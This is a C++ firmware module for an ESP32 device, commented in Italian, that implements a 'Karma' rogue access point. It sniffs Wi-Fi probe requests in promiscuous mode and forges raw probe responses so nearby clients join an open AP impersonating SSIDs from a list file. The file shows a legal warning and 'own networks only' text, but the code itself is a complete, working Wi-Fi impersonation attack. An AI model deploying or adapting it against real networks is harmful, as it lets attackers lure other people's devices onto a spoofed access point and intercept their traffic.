#include "Karma.h"

#include <Arduino.h>
#include <WiFi.h>
#include <esp_wifi.h>

#include <cstring>
#include <string>
#include <strings.h>
#include <vector>

#include "Display.h"
#include "Logger.h"
#include "ModuleFlags.h"
#include "Navigation.h"
#include "Storage.h"
#include "Ui.h"
#include "WifiExtCommon.h"
#include "WifiSetup.h"

#if ENABLE_MODULE_WIFIEXT && ENABLE_OFFENSIVE

namespace wifiext {
namespace {

constexpr int kMaxSsids = 20;
constexpr const char* kListPath = "/wifiext/karma.txt";

std::string g_ssids[kMaxSsids];
int g_ssidCount = 0;
uint8_t g_channel = 6;

struct ProbeSlot {
    uint8_t mac[6];
    uint8_t length;
    uint8_t ssid[33];
};

// Anello scritto dal task WiFi e svuotato dal loop principale.
ProbeSlot g_probes[4];
volatile uint8_t g_probeHead = 0;
volatile uint8_t g_probeTail = 0;
portMUX_TYPE g_probeMux = portMUX_INITIALIZER_UNLOCKED;

uint32_t g_probeCount = 0;
uint32_t g_probeDropped = 0;
uint32_t g_responses = 0;
uint32_t g_txFail = 0;
uint16_t g_sequence = 0;
uint8_t g_bssid[6] = {0};

void addSsid(const std::string& raw) {
    const std::string ssid = trim(raw);
    if (ssid.empty() || ssid[0] == '#' || g_ssidCount >= kMaxSsids) {
        return;
    }
    for (int i = 0; i < g_ssidCount; ++i) {
        if (g_ssids[i] == ssid) {
            return;
        }
    }
    g_ssids[g_ssidCount++] = shorten(ssid, 32);
}

bool loadListFile() {
    std::string text;
    if (!storage::readText(kListPath, text, 2048)) {
        return false;
    }
    std::string line;
    for (char c : text) {
        if (c == '\n' || c == '\r') {
            addSsid(line);
            line.clear();
        } else if (line.size() < 33) {
            line.push_back(c);
        }
    }
    addSsid(line);
    return g_ssidCount > 0;
}

// Allinea il canale dell'AP a quello della prima rete della lista, se visibile:
// i probe arrivano solo sul canale su cui ascolta la radio.
void alignChannel() {
    if (g_ssidCount == 0) {
        return;
    }
    std::vector<wifisetup::Network> networks;
    if (!wifisetup::scanNetworks(networks, "WiFi+")) {
        return;
    }
    for (const auto& network : networks) {
        if (strcasecmp(network.ssid.c_str(), g_ssids[0].c_str()) == 0 &&
            network.channel >= 1 && network.channel <= 13) {
            g_channel = static_cast<uint8_t>(network.channel);
            return;
        }
    }
}

bool inList(const uint8_t* ssid, uint8_t length) {
    if (length == 0 || length > 32) {
        return false;
    }
    char name[33];
    memcpy(name, ssid, length);
    name[length] = '\0';
    for (int i = 0; i < g_ssidCount; ++i) {
        if (strcasecmp(name, g_ssids[i].c_str()) == 0) {
            return true;
        }
    }
    return false;
}

void probeCallback(void* buf, wifi_promiscuous_pkt_type_t) {
    auto* packet = static_cast<wifi_promiscuous_pkt_t*>(buf);
    const uint8_t* payload = packet->payload;
    int length = packet->rx_ctrl.sig_len;
    if (payload == nullptr || length < 26) {
        return;
    }
    length -= 4;  // FCS incluso in sig_len
    if ((payload[0] & 0xFC) != 0x40) {  // management, probe request
        return;
    }
    int offset = 24 + ((payload[1] & 0x80) ? 4 : 0);  // HT control
    const uint8_t* ssid = nullptr;
    uint8_t ssidLength = 0;
    while (offset + 2 <= length) {
        const uint8_t id = payload[offset];
        const uint8_t size = payload[offset + 1];
        if (offset + 2 + size > length) {
            break;
        }
        if (id == 0) {
            ssid = payload + offset + 2;
            ssidLength = size;
            break;
        }
        offset += 2 + size;
    }
    if (ssid == nullptr || ssidLength > 32) {
        return;
    }

    portENTER_CRITICAL(&g_probeMux);
    const uint8_t next = static_cast<uint8_t>((g_probeHead + 1) & 3);
    if (next == g_probeTail) {
        ++g_probeDropped;
    } else {
        memcpy(g_probes[g_probeHead].mac, payload + 10, 6);
        g_probes[g_probeHead].length = ssidLength;
        memcpy(g_probes[g_probeHead].ssid, ssid, ssidLength);
        g_probeHead = next;
    }
    ++g_probeCount;
    portEXIT_CRITICAL(&g_probeMux);
}

bool sendProbeResponse(const uint8_t* destination, const uint8_t* ssid,
                       uint8_t ssidLength) {
    uint8_t frame[96];
    memset(frame, 0, sizeof(frame));
    frame[0] = 0x50;  // probe response
    frame[1] = 0x00;
    memcpy(frame + 4, destination, 6);
    memcpy(frame + 10, g_bssid, 6);
    memcpy(frame + 16, g_bssid, 6);
    const uint16_t sequence = g_sequence++ & 0x0FFF;
    frame[22] = static_cast<uint8_t>((sequence << 4) & 0xFF);
    frame[23] = static_cast<uint8_t>(sequence >> 4);
    // timestamp 8 byte a zero
    frame[32] = 0x64;  // beacon interval 100 TU
    frame[34] = 0x21;  // capability: ESS | short preamble | short slot
    frame[35] = 0x04;
    size_t offset = 36;
    frame[offset++] = 0;
    frame[offset++] = ssidLength;
    memcpy(frame + offset, ssid, ssidLength);
    offset += ssidLength;
    static const uint8_t kRates[] = {0x82, 0x84, 0x8B, 0x96, 0x0C, 0x12, 0x18, 0x24};
    frame[offset++] = 1;
    frame[offset++] = sizeof(kRates);
    memcpy(frame + offset, kRates, sizeof(kRates));
    offset += sizeof(kRates);
    frame[offset++] = 3;
    frame[offset++] = 1;
    frame[offset++] = g_channel;

    esp_err_t error =
        esp_wifi_80211_tx(WIFI_IF_AP, frame, static_cast<int>(offset), false);
    if (error != ESP_OK) {
        // Dopo l'associazione il driver richiede la sequenza gestita da lui.
        error = esp_wifi_80211_tx(WIFI_IF_AP, frame, static_cast<int>(offset), true);
    }
    return error == ESP_OK;
}

void answerProbes() {
    for (int i = 0; i < 4; ++i) {
        ProbeSlot slot;
        bool have = false;
        portENTER_CRITICAL(&g_probeMux);
        if (g_probeTail != g_probeHead) {
            slot = g_probes[g_probeTail];
            g_probeTail = static_cast<uint8_t>((g_probeTail + 1) & 3);
            have = true;
        }
        portEXIT_CRITICAL(&g_probeMux);
        if (!have) {
            break;
        }
        if (slot.length == 0) {
            // Probe wildcard: si usa l'SSID dell'AP.
            const std::string& apSsid = g_ssids[0];
            if (sendProbeResponse(slot.mac,
                                  reinterpret_cast<const uint8_t*>(apSsid.data()),
                                  static_cast<uint8_t>(apSsid.size()))) {
                ++g_responses;
            } else {
                ++g_txFail;
            }
            continue;
        }
        if (!inList(slot.ssid, slot.length)) {
            continue;
        }
        if (sendProbeResponse(slot.mac, slot.ssid, slot.length)) {
            ++g_responses;
        } else {
            ++g_txFail;
        }
    }
}

void drawKarma(const std::string& ip) {
    display::clear();
    display::header("Karma AP", "WiFi+");
    display::text(8, 26, "SSID: " + shorten(g_ssids[0], 24), display::kAccent, 2);
    display::text(8, 46,
                  "IP " + ip + "   canale " + std::to_string(g_channel),
                  display::kText, 0);
    display::text(8, 60,
                  "Client " + std::to_string(WiFi.softAPgetStationNum()) +
                      "   Probe " + std::to_string(g_probeCount),
                  display::kText, 0);
    display::text(8, 74,
                  "Risposte " + std::to_string(g_responses) + "   KO " +
                      std::to_string(g_txFail),
                  display::kText, 0);
    display::text(8, 88, "Lista: " + std::to_string(g_ssidCount) + " SSID",
                  display::kTextDim, 0);
    display::text(8, 102, sdFreeText(), display::kTextDim, 0);
    if (g_probeDropped > 0) {
        display::text(150, 60, "P" + std::to_string(g_probeDropped),
                      display::kTextDim, 0);
    }
    display::footer("ESC = ferma   solo reti proprie");
    display::push();
}

}  // namespace

void runKarma() {
    if (!ui::legalWarning("Karma AP",
                          {"AP aperto che risponde ai probe",
                           "request con gli SSID della lista.",
                           "Nessun deauth. Solo reti proprie."},
                          "WiFi+")) {
        return;
    }

    g_ssidCount = 0;
    g_channel = 6;
    g_probeHead = 0;
    g_probeTail = 0;
    g_probeCount = 0;
    g_probeDropped = 0;
    g_responses = 0;
    g_txFail = 0;
    g_sequence = 0;

    if (!loadListFile()) {
        ui::message("Karma AP",
                    {"Serve /wifiext/karma.txt.", "Senza una lista esplicita",
                     "nessun SSID viene impersonato."},
                    "WiFi+");
        return;
    }
    alignChannel();
    if (g_ssidCount == 0) {
        ui::message("Karma AP", {"Nessun SSID disponibile."}, "WiFi+");
        return;
    }

    const std::string apSsid = g_ssids[0];
    WiFi.persistent(false);
    WiFi.mode(WIFI_AP);
    delay(60);
    if (!WiFi.softAP(apSsid.c_str(), nullptr, g_channel, 0, 4)) {
        WiFi.mode(WIFI_OFF);
        ui::message("Karma AP", {"Creazione access point non riuscita."}, "WiFi+");
        return;
    }
    esp_wifi_get_mac(WIFI_IF_AP, g_bssid);

    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(nullptr);
    esp_wifi_set_promiscuous_rx_cb(probeCallback);
    wifi_promiscuous_filter_t filter = {};
    filter.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT;
    esp_wifi_set_promiscuous_filter(&filter);
    if (esp_wifi_set_promiscuous(true) != ESP_OK) {
        logger::warn("Karma: modalita' promiscua non disponibile");
    }

    const std::string ip = WiFi.softAPIP().toString().c_str();
    logger::info("Karma avviato: ssid=%s canale=%u", apSsid.c_str(), g_channel);

    uint32_t lastDraw = 0;
    navigation::waitRelease();
    for (;;) {
        navigation::update();
        if (navigation::poll().type == navigation::Event::Back) {
            break;
        }
        answerProbes();

        const uint32_t now = millis();
        if (now - lastDraw > 300) {
            drawKarma(ip);
            lastDraw = now;
        }
        delay(5);
    }

    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(nullptr);
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_OFF);
    logger::info("Karma fermato: %u probe, %u risposte, %u errori",
                 static_cast<unsigned>(g_probeCount),
                 static_cast<unsigned>(g_responses), static_cast<unsigned>(g_txFail));
}

}  // namespace wifiext

#endif  // ENABLE_MODULE_WIFIEXT && ENABLE_OFFENSIVE
